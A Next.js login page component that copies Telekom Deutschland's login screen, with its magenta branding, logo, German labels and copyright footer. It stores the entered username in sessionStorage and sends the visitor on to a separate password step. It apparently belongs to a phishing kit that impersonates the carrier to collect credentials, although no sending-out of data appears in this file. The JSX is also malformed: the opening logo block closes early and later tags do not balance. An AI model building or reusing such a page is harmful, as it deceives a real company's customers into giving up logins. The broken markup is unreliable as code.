"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Switch } from "@/components/ui/switch"
import { HelpCircle } from "lucide-react"

export default function LoginPage() {
  const router = useRouter()
  const [email, setEmail] = useState("")
  const [rememberEmail, setRememberEmail] = useState(true)

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (email.trim()) {
      sessionStorage.setItem("username", email)
      router.push("/password")
    }
  }

  return (
    <div className="absolute top-0 left-0 w-24 h-24 bg-[#E20074] flex items-center justify-center">
  <img
    src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAM4AAACUCAMAAADs1OZnAAAAkFBMVEXiAH7////hAHniC4HkH4fhAHX50OXiAHzpZp/86/P97/X9//vnV5vhAHfwudH65u/63+r20ODfAG/mMo31xdvlL4joPpD4zd/mT5D21ePnRpL//P/0v9jiGHzwpcTlJITiAGvqc6fwmsHtjrXqgq/ys9HhLIDy1Oj63u/jOYfoaKjwgLHpRInzrM3oYJ/w2uiFPM5fAAAEQUlEQVR4nO3dfVeqMBwH8LFJExJBU0MR8Qm7XdPe/7u7YHlLHTAGe9Dz+/7TOTnmPk0GwliIoAdKBwHH3ADH5ADH5ADH5ADH5AhxPFtJPDWceP6kIoM0VsNxLCXxFXF8NZwAOMABDnAM4kROEATTacB+MX8lCJzoLjjBfLHZHmeTcUK7LquAc4yT8WR23G4W8/KadHJOf2x/cwwT7HkYU4pw131mcXrZixTjrFASdtfFx2TNveOmM5tkjHOKOT91UWrPUmYnauY4h2RIL8rxcLJ3x8vkwOwinZx+aNOrcjycLBRRu9e3bovq40THBN+U4+SciiZdg3rnbZf9jW8qqsHJNh+/mcLp7zxy/UmryyF4NzeDk2YfNMKopg4n654bjx7OIMaI0Tc1OXn5+I9+zueOMjH1OZS+XwzYOjju0SuqoS4HEbqKrJ9TOfWcyFoUtU2AgwhO9faOQ3BhBfU5yOv8OuHRwPk7LC4nwEH2XifHX5ZsLsJBQ1cXJ2vrvmhUyyPEwRvrfPqmvHf8D1rSNCEOCt3z2KaccygtJ8LJTq//D26qOdHWLisn1jveRlfvBLOSPUeUQ8NAE2dUfstCjIPQQBNnUfpZE+XYqR5O1C1vlyDH20d6OJPSXUeUg3t6OG7FPiDIodTVwnGW5eUEOWSph/NUcvqZR3RkWwZaOH1ZnJEWzkES5zxSq+aUH3aE9x3VnO8LFBVHUeHeGX5zVN2IdyVzDko5aDw55aWimCiHdr7qn9RvmRCH5vebyr6HfkWUkx9J81QWu43MGVPiHOEAhzvAaRrgcAc4TQMc7gCnaYCDzudU17m+4cvPKahPDYeOJy/MjIU4ZMyu7bo6WZx46visuGlHhJOkLrM651XztPCRCIeOB4xCeXTPNhTkvAIHOMABDnCAAxzgAAc4wAEOcIADHOAYxHmwKznz6YCV6aL+o3xZkkNBdX1F8wqGBbmaNsF7UddeMmtbVszCaI2D2Btd/7LZJXehdolecucpdTd3EPgCnKYBDneA0zTA4Q5wmgY43AFO0wCHO2zOs3N8KI57vxzGZ81yK54xaxKZHG/1UBx7w1wVK9oLLCnJGYkcYi9YGsta21TWm8rsHZqyOQd6hxyCOyM2Z9S5Qw7CvYLLi34oMpGQKxI5dM/WWNZe2tAmkRM/FXFGAhcE+SKP4x2LNJYVyuoeaRwclyzF6MeenN1HFocm1+t5XaSf3A2HEJSvTla+TmYae4i5bFizyOgd7Nlh5dKhnzMPt78HtcY5PUqI8zU0SbgqOH5eZr4KyWnNTZw/6dhOK1rjzE7prbbrlHuNWj9db1a9ry3baUY7HIo+vie+u5VLy14mOs9w/2ihGa31Dg3rKX55vn+2c+KjnXNWha3sPsBhBTgGc2hjzoMNBUZxCJ70G+a9lS/cLfUOIV7DcM5VqAj8wxqTAxyTAxyTAxyTAxyT82icf21jhjtsUphUAAAAAElFTkSuQmCC"
    alt="Logo"
    className="w-12 h-12 md:w-16 md:h-16 object-contain"
  />
</div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-lg bg-white rounded-2xl shadow-xl p-8 md:p-12 relative">
          {/* Help Icon */}
          <button className="absolute top-6 right-6 text-gray-600 hover:text-gray-800">
            <HelpCircle className="w-6 h-6" />
          </button>

          {/* Title */}
          <h1 className="text-3xl md:text-4xl font-bold mb-8 md:mb-10 text-black">Telekom Login</h1>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Email Input */}
            <div className="relative">
              <Input
                type="email"
                placeholder="Benutzername"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full h-12 md:h-14 px-4 pr-10 text-base md:text-lg border-gray-300 rounded-lg focus:border-[#E20074] focus:ring-[#E20074]"
                required
              />
              <button
                type="button"
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
              >
                <HelpCircle className="w-5 h-5" />
              </button>
            </div>

            {/* Remember Email Toggle */}
            <div className="flex items-center gap-3">
              <Switch
                checked={rememberEmail}
                onCheckedChange={setRememberEmail}
                className="data-[state=checked]:bg-[#E20074]"
              />
              <span className="text-sm md:text-base text-black">Benutzername merken</span>
              <button type="button" className="text-gray-500 hover:text-gray-700">
                <HelpCircle className="w-4 h-4" />
              </button>
            </div>

            {/* Continue Button */}
            <Button
              type="submit"
              className="w-full h-12 md:h-14 bg-[#E20074] hover:bg-[#C00060] text-white text-base md:text-lg font-semibold rounded-lg"
            >
              Weiter
            </Button>

            {/* Other Login Options */}
            <Button
              type="button"
              variant="outline"
              className="w-full h-12 md:h-14 bg-white border-gray-300 text-black hover:bg-gray-50 text-base md:text-lg font-normal rounded-lg"
            >
              Andere Anmeldeoptionen
            </Button>
          </form>
        </div>
      </div>

      {/* Footer */}
      <footer className="p-4 md:p-6 text-white text-xs md:text-sm">
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
          <div>
            <p>© Telekom Deutschland GmbH</p>
            <p>26.26.1</p>
          </div>
          <div className="flex gap-4 md:gap-6">
            <a href="#" className="hover:underline">
              Impressum
            </a>
            <a href="#" className="hover:underline">
              Datenschutz
            </a>
          </div>
        </div>
      </footer>
    </div>
  )
}
